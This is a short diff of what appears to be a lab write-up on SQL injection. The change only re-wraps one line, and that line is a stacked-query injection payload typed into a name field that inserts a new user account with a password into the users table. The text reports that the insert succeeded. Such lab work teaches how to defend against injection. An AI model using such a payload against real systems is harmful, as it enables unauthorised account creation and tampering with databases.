@@ -19,7 +19,8 @@
 - Command use:
 
 ```sql
-David'; INSERT INTO users(first, uname, passwd, profile) VALUES('cat', 'cat', PASSWORD('cat'), 'Injection success')#
+David'; INSERT INTO users(first, uname, passwd, profile) VALUES('cat', 'cat', PASSWORD('cat'),
+ 'Injection success')#
 ```
 - The picture below show that the new record has been inserted successfully.
 
